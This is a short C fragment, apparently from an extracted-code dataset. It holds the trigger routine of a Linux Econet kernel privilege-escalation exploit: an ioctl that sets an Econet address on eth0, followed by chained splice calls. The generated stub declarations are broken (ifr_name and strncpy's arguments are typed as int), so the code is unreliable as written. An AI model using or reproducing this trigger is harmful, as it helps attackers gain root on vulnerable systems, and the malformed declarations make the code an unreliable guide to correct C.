
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct ifreq {int ifr_name; } ;
typedef int ifr ;


 int IFNAMSIZ ;
 int SIOCSIFADDR ;
 int exit (int ) ;
 int ioctl (int,int ,struct ifreq*) ;
 int memset (struct ifreq*,int ,int) ;
 int printf (char*) ;
 int splice (int,int *,int,int *,int,int ) ;
 int strncpy (int ,char*,int ) ;

int trigger(int * fildes)
{
        int ret;
        struct ifreq ifr;

        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);

        ret = ioctl(fildes[2], SIOCSIFADDR, &ifr);

        if(ret < 0) {
                printf("[*] Failed to set Econet address.\n");
                return -1;
        }

        splice(fildes[3], ((void*)0), fildes[1], ((void*)0), 128, 0);
        splice(fildes[0], ((void*)0), fildes[2], ((void*)0), 128, 0);


        exit(0);
}
